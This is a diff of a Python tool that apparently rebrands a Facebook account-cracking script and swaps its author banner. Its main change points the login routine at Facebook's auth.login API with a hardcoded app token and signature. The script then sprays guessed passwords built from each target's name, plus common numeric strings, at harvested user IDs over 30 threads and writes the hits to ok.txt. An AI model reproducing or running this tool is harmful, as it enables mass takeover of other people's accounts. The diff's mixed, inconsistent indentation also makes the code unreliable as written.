@@ -14,7 +14,7 @@ except ImportError:
 os.system("clear")
 """
 try:
-    my = requests.get("https://m.facebook.com/Techabm")
+    my = requests.get("https://m.facebook.com/jam.shahrukh.official")
 except requests.exceptions.ConnectionError:
     print("")
     print("\t    \033[1;97mTurn on mobile data\033[0;97m")
@@ -95,7 +95,7 @@ c2 = "\033[0;97m"
 c3 = "\033[1;31m"
 #MyLogo
 def logo():
-    os.system('echo -e "\n\n ____  ____   _____   ___     __ ______\nl    j|    \ |     | /  _]   /  ]      T\n |  T |  _  Y|   __j/  [_   /  /|      |\n |  | |  |  ||  l_ Y    _] /  / l_j  l_j\n |  | |  |  ||   _]|   [_ /   \_  |  |  \n j  l |  |  ||  T  |     T\     | |  |  \n|____jl__j__jl__j  l_____j \____j l__j\n\n-----------------------------------------------\n\n➣ Author : Tech Abm\n➣ Github : https://github.com/Tech-abm\n➣ Fb Page : https://m.facebook.com/Techabm\n\n-----------------------------------------------" | lolcat')
+    os.system('echo -e "\n\n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀\n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN\n\033[1;94m===============================================\n\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN\n\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen\n\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official\n\033[1;94m===============================================" | lolcat')
 def tech_abm():
     os.system("clear")
     logo()
@@ -346,9 +346,9 @@ def b_menu_select():
 		uid,name=user.split("|")
 		try:
 		    pass1=name+"123"
-		    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
+		    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
 		    q = json.loads(data)
-                    if 'loc' in q:
+                    if 'access_token' in q:
 		        print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass1+" | "+name)
 		        ok=open("ok.txt","a")
 		        ok.write(uid+" | "+pass1+"\n")
@@ -356,9 +356,9 @@ def b_menu_select():
 		        oks.append(uid + pass1)
 		    else:
 		    	pass2=name+"1234"
-		        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
+		        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
 		        q = json.loads(data)
-		        if 'loc' in q:
+		        if 'access_token' in q:
 		            print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass2+" | "+name)
 		            ok=open("ok.txt","a")
 		            ok.write(uid+" | "+pass2+"\n")
@@ -366,9 +366,9 @@ def b_menu_select():
 		            oks.append(uid + pass2)
 		        else:
 		            pass3=name+"12345"
-		            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
+		            data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                             q = json.loads(data)
-		            if 'loc' in q:
+		            if 'access_token' in q:
 		                print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass3+" | "+name)
 		                ok=open("ok.txt","a")
 		                ok.write(uid+" | "+pass3+"\n")
@@ -376,9 +376,9 @@ def b_menu_select():
 		                oks.append(uid + pass3)
 		            else:
 				pass4="234567"
-		                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
+		                data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                 q = json.loads(data)
-		    	        if 'loc' in q:
+		    	        if 'access_token' in q:
 		                    print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass4+" | "+name)
 		                    ok=open("ok.txt","a")
 		                    ok.write(uid+" | "+pass4+"\n")
@@ -386,9 +386,9 @@ def b_menu_select():
 		                    oks.append(uid + pass4)
 		                else:
 		                    pass5="223344"
-		                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
+		                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                     q = json.loads(data)
-		                    if 'loc' in q:
+		                    if 'access_token' in q:
 		                        print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass5+" | "+name)
 		                        ok=open("ok.txt","a")
 		                        ok.write(uid+" | "+pass5+"\n")
@@ -396,9 +396,9 @@ def b_menu_select():
 		                        oks.append(uid + pass5)
 		                    else:
 		                        pass6="334455"
-		                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
+		                        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                         q = json.loads(data)
-		                        if 'loc' in q:
+		                        if 'access_token' in q:
 		                            print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass6+" | "+name)
 		                            ok=open("ok.txt","a")
 		                            ok.write(uid+" | "+pass6+"\n")
@@ -406,9 +406,9 @@ def b_menu_select():
 		                            oks.append(uid + pass6)
 		                        else:
 		                            pass7="445566"
-		                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text
+		                            data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                             q = json.loads(data)
-					    if 'loc' in q:
+					    if 'access_token' in q:
 		                                print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass7+" | "+name)
 		                                ok=open("ok.txt","a")
 		                                ok.write(uid+" | "+pass7+"\n")
@@ -416,9 +416,9 @@ def b_menu_select():
 		                                oks.append(uid + pass7)
 		                            else:
 						pass8="556677"
-		                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers = header).text
+		                                data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                                 q = json.loads(data)
-		    	                        if 'loc' in q:
+		    	                        if 'access_token' in q:
 		                                    print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass8+" | "+name)
 		                                    ok=open("ok.txt","a")
 		                                    ok.write(uid+" | "+pass8+"\n")
@@ -426,9 +426,9 @@ def b_menu_select():
 		                                    oks.append(uid + pass8)
 						else:
 		                                    pass9="786786786"
-		                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers = header).text
+		                                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers = header).text
                                                     q = json.loads(data)
-		                                    if 'loc' in q:
+		                                    if 'access_token' in q:
 		                                        print("\x1b[1;92m[SANI-OK]➤ "+uid+" | "+pass9+" | "+name)
 		                                        ok=open("ok.txt","a")
 		                                        ok.write(uid+" | "+pass9+"\n")
@@ -438,7 +438,7 @@ def b_menu_select():
 		except:
 			pass
 		
-	p = ThreadPool(50)
+	p = ThreadPool(30)
 	p.map(main, id)
 	os.system('echo -e "-----------------------------------------------"| lolcat')
 	os.system('echo -e "The Process has been completed "| lolcat')
